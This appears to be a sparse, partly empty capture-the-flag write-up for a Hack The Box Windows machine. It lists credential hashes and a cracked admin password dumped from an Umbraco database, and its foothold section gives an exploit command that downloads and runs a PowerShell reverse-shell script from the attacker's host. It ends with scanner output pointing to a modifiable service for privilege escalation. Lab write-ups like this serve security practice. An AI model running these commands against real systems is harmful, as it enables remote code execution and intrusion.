Name & IP Address of Machine:
> REMOTE : `10.10.10.180`
<!-- TOC -->

- [Synopsis](#synopsis)
- [Enumeration](#enumeration)
- [FootHold](#foothold)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->

Hash in umbraco.sdf:
`admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese`
smith@htb.local:jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts=

```bash
Administratoradmindefaulten-US                                                                                                         
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d                                                                     
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d            
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7a
bdf50                                                                                                                                  
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4
f882f                                                                                                                                  
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen
-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e                                                                              
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.locale
n-US7e39df83-5e64-4b93-9702-ae257a9b9749                                                                                               
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.loca
len-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

## Synopsis


## Enumeration
Opened Ports: 
- [ ] 2049 (Network File System)



## FootHold
```bash
 python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28:8000/Invoke-PowerShellTcp.ps1')"

```
## Lateral Movement

## Privilege Escalation
```bash
  [+] Modifiable Services                                                                                                              
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services             
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:                                                                                          
    UsoSvc: AllAccess, Start                                                                                                    
```




<!-- ## Thank You 
🕉️  -->


<!-- ## Tools Used.
- [ ] . -->